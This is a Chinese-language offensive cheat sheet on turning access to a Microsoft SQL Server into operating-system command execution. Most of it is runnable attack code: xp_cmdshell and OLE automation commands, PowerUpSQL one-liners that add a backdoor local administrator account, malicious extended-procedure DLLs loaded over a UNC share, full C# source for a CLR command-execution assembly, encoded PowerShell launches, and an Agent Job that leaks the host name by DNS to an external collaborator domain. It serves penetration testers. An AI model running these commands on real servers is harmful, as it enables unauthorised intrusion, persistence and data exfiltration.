# MSSQL - 命令执行 (Command Execution)

## 目录 (Summary)

- [通过 xp_cmdshell 执行命令](#command-execution-via-xp_cmdshell)
- [扩展存储过程 (Extended Stored Procedure)](#extended-stored-procedure)
    - [添加并列出扩展存储过程](#add-the-extended stored-procedure-and-list-extended-stored-procedures)
- [CLR 程序集 (CLR Assemblies)](#clr-assemblies)
    - [使用 CLR 程序集执行命令](#execute-commands-using-clr-assembly)
    - [手动创建 CLR DLL 并导入](#manually-creating-a-clr-dll-and-importing-it)
- [OLE 自动化 (OLE Automation)](#ole-automation)
    - [使用 OLE 自动化过程执行命令](#execute-commands-using-ole-automation-procedures)
- [代理作业 (Agent Jobs)](#agent-jobs)
    - [通过 SQL 代理作业服务执行命令](#execute-commands-through-sql-agent-job-service)
    - [列出所有作业](#list-all-jobs)
- [外部脚本 (External Scripts)](#external-scripts)
    - [Python](#python)
    - [R](#r)

## 通过 xp_cmdshell 执行命令 (Command Execution via xp_cmdshell)

> 自 SQL Server 2005 起，xp_cmdshell 默认处于禁用状态。

```ps1
PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command whoami

# 创建本地用户 backup 并将其添加到本地管理员组：
PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "net user backup Password1234 /add'" -Verbose
PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "net localgroup administrators backup /add" -Verbose
```

- 手动执行 SQL 查询

 ```sql
 EXEC xp_cmdshell "net user";
 EXEC master..xp_cmdshell 'whoami'
 EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
 EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
 ```

- 如果需要重新激活 xp_cmdshell（自 SQL Server 2005 起默认禁用）

 ```sql
 EXEC sp_configure 'show advanced options',1;
 RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell',1;
 RECONFIGURE;
 ```

- 如果该存储过程已被卸载

 ```sql
 sp_addextendedproc 'xp_cmdshell','xplog70.dll'
 ```

## 扩展存储过程 (Extended Stored Procedure)

### 添加并列出扩展存储过程

```ps1
# 创建恶意 DLL
Create-SQLFileXpDll -OutFile C:\temp\test.dll -Command "echo test > c:\temp\test.txt" -ExportName xp_test

# 加载 DLL 并调用 xp_test
Get-SQLQuery -UserName sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Query "sp_addextendedproc 'xp_test', '\\10.10.0.1\temp\test.dll'"
Get-SQLQuery -UserName sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Query "EXEC xp_test"

# 列出已存在的存储过程
Get-SQLStoredProcedureXP -Instance "<DBSERVERNAME\DBInstance>" -Verbose
```

- 使用 [xp_evil_template.cpp](https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp) 构建 DLL
- 加载 DLL

 ```sql
 -- 也可以通过 UNC 路径或 Webdav 加载
 sp_addextendedproc 'xp_calc', 'C:\mydll\xp_calc.dll'
 EXEC xp_calc
 sp_dropextendedproc 'xp_calc'
 ```

## CLR 程序集 (CLR Assemblies)

前提条件：

- sysadmin 权限
- CREATE ASSEMBLY 权限（或）
- ALTER ASSEMBLY 权限（或）

执行时使用的是 **服务账号 (service account)** 的权限。

### 使用 CLR 程序集执行命令

```ps1
# 为 DLL 创建 C# 代码，生成 DLL 并生成带有 DLL 十六进制字符串的 SQL 查询
Create-SQLFileCLRDll -ProcedureName "runcmd" -OutFile runcmd -OutDir C:\Users\user\Desktop

# 使用 CLR 程序集执行命令
Invoke-SQLOSCmdCLR -Username sa -Password <password> -Instance <instance> -Command "whoami" -Verbose
Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "whoami" Verbose
Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64>" -Verbose

# 列出所有通过 CLR 添加的存储过程
Get-SQLStoredProcedureCLR -Instance <instance> -Verbose
```

### 手动创建 CLR DLL 并导入

使用以下命令创建一个具有如下内容的 C# DLL 文件：`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library c:\temp\cmd_exec.cs`

```csharp
using System;
using System.Data;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using Microsoft.SqlServer.Server;
using System.IO;
using System.Diagnostics;
using System.Text;

public partial class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void cmd_exec (SqlString execCommand)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand.Value);
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();

        // 创建记录并指定列的元数据。
        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
        
        // 标记结果集的开始。
        SqlContext.Pipe.SendResultsStart(record);

        // 为行中的每个列设置值
        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());

        // 将行发送回客户端。
        SqlContext.Pipe.SendResultsRow(record);
        
        // 标记结果集的结束。
        SqlContext.Pipe.SendResultsEnd();
        
        proc.WaitForExit();
        proc.Close();
    }
};
```

然后按照以下说明操作：

1. 在服务器上启用 `show advanced options`

    ```sql
    sp_configure 'show advanced options',1; 
    RECONFIGURE
    GO
    ```

2. 在服务器上启用 CLR

    ```sql
    sp_configure 'clr enabled',1
    RECONFIGURE
    GO
    ```

3. 通过添加其 SHA512 哈希来信任该程序集

    ```sql
    EXEC sys.sp_add_trusted_assembly 0x[SHA512], N'assembly';
    ```

4. 导入程序集

    ```sql
    CREATE ASSEMBLY my_assembly
    FROM 'c:\temp\cmd_exec.dll'
    WITH PERMISSION_SET = UNSAFE;
    ```

5. 将程序集链接到存储过程

    ```sql
    CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];
    GO
    ```

6. 执行并清理

 ```sql
 cmd_exec "whoami"
 DROP PROCEDURE cmd_exec
 DROP ASSEMBLY my_assembly
 ```

**CREATE ASSEMBLY** 也接受 CLR DLL 的十六进制字符串表示

```sql
CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM 
0x4D5A90000300000004000000F[已截断]
WITH PERMISSION_SET = UNSAFE 
GO 
```

## OLE 自动化 (OLE Automation)

- :warning: 默认禁用
- 执行时使用的是 **服务账号 (service account)** 的权限。

### 使用 OLE 自动化过程执行命令

```ps1
Invoke-SQLOSCmdOle -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "whoami" Verbose
```

```ps1
# 启用 OLE 自动化
EXEC sp_configure 'show advanced options', 1
EXEC sp_configure reconfigure
EXEC sp_configure 'OLE Automation Procedures', 1
EXEC sp_configure reconfigure

# 执行命令
DECLARE @execmd INT
EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT
EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c'
```

```powershell
# https://github.com/blackarrowsec/mssqlproxy/blob/master/mssqlclient.py
python3 mssqlclient.py 'host/username:password@10.10.10.10' -install -clr Microsoft.SqlServer.Proxy.dll
python3 mssqlclient.py 'host/username:password@10.10.10.10' -check -reciclador 'C:\windows\temp\reciclador.dll'
python3 mssqlclient.py 'host/username:password@10.10.10.10' -start -reciclador 'C:\windows\temp\reciclador.dll'
SQL> enable_ole
SQL> upload reciclador.dll C:\windows\temp\reciclador.dll
```

## 代理作业 (Agent Jobs)

- 如果未配置代理账号，执行时使用的是 **SQL Server 代理服务账号 (SQL Server Agent service account)** 的权限。
- :warning: 需要 **sysadmin** 或 **SQLAgentUserRole**、**SQLAgentReaderRole** 以及 **SQLAgentOperatorRole** 角色才能创建作业。

### 通过 SQL 代理作业服务执行命令

```ps1
Invoke-SQLOSCmdAgentJob -Subsystem PowerShell -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell e <base64encodedscript>" -Verbose
子系统选项：
–Subsystem CmdExec
-SubSystem PowerShell
–Subsystem VBScript
–Subsystem Jscript
```

```sql
USE msdb; 
EXEC dbo.sp_add_job @job_name = N'test_powershell_job1'; 
EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'$name=$env:COMPUTERNAME[10];nslookup "$name.redacted.burpcollaborator.net"', @retry_attempts = 1, @retry_interval = 5 ;
EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; 
EXEC dbo.sp_start_job N'test_powershell_job1';

-- 删除
EXEC dbo.sp_delete_job @job_name = N'test_powershell_job1';
```

### 列出所有作业 (List All Jobs)

```ps1
SELECT job_id, [name] FROM msdb.dbo.sysjobs;
SELECT job.job_id, notify_level_email, name, enabled, description, step_name, command, server, database_name FROM msdb.dbo.sysjobs job INNER JOIN msdb.dbo.sysjobsteps steps ON job.job_id = steps.job_id
Get-SQLAgentJob -Instance "<DBSERVERNAME\DBInstance>" -username sa -Password Password1234 -Verbose
```

## 外部脚本 (External Scripts)

要求：

- 必须安装 '高级分析扩展 (Advanced Analytics Extensions)' 功能
- 启用 **外部脚本 (external scripts)**。

```sql
sp_configure 'external scripts enabled', 1;
RECONFIGURE;
```

### Python

```ps1
Invoke-SQLOSCmdPython -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64encodedscript>" -Verbose

EXEC sp_execute_external_script @language =N'Python',@script=N'import subprocess p = subprocess.Popen("cmd.exe /c whoami", stdout=subprocess.PIPE) OutputDataSet = pandas.DataFrame([str(p.stdout.read(), "utf-8")])'
WITH RESULT SETS (([cmd_out] nvarchar(max)))
```

### R

```ps1
Invoke-SQLOSCmdR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64encodedscript>" -Verbose

EXEC sp_execute_external_script @language=N'R',@script=N'OutputDataSet <- data.frame(system("cmd.exe /c dir",intern=T))'
WITH RESULT SETS (([cmd_out] text));
GO

@script=N'OutputDataSet <-data.frame(shell("dir",intern=T))'
```

## 参考资料 (References)

* [Attacking SQL Server CLR Assemblies - Scott Sutherland - July 13th, 2017](https://blog.netspi.com/attacking-sql-server-clr-assemblies/)
* [MSSQL Agent Jobs for Command Execution - Nicholas Popovich - September 21, 2016](https://www.optiv.com/explore-optiv-insights/blog/mssql-agent-jobs-command-execution)
